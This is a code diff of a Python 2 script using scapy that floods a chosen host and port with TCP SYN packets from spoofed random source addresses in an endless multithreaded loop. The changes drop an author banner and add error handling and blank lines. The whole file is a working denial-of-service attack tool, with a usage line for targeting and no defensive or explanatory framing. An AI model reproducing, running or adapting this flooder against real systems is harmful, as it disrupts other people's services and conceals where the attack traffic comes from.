@@ -1,11 +1,6 @@
 from scapy.all import *
 import sys,socket,threading,random
 
-print '#########################################'
-print '#SYN_FLOOD - A Multithreaded SYN FLOODER#'
-print '#\t\tAuthor: VinhNgo \t#'
-print '#########################################'
-
 if len(sys.argv)!=3:
 	print'Usage {} <Target> <Port>'.format(sys.argv[0])
 	sys.exit(1)
@@ -20,7 +15,7 @@ class synFlood(threading.Thread):
                 threading.Thread.__init__(self)
 	def addr_rand(self):
 		addr = "{}.{}.{}.{}".format(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
-		return addr        
+		return addr
 	def run(self):
 		ip = IP(src=self.addr_rand(),dst=target)
 		tcp = TCP(sport=random.randint(1,65535),dport=port,flags="S")
@@ -28,8 +23,30 @@ class synFlood(threading.Thread):
 		send(p,verbose=0)
 
 print 'Flooding {}:{} with SYN packets.'.format(target,port)
-while 1:
-	synFlood().start()
-	total+=1
-	sys.stdout.write('\rTotal packets sent:\t\t {}'.format(total))
-print"TCP Dos Complete!"
+try:
+	while True:
+		synFlood().start()
+		total+=1
+		sys.stdout.write('\rTotal packets sent:\t\t {}'.format(total))
+		#print '\rTotal packets sent:\t\t {}'.format(total)
+except KeyboardInterrupt:
+	print "\nExitting Program !!!\nTCP Dos Complete!"
+except socket.gaierror:
+	print "\nHostname Could Not Be Resolved !!!"
+	sys.exit()
+except socket.error:
+	print "\nServer not responding !!!"
+	sys.exit()
+
+
+
+
+
+
+
+
+
+
+
+
+
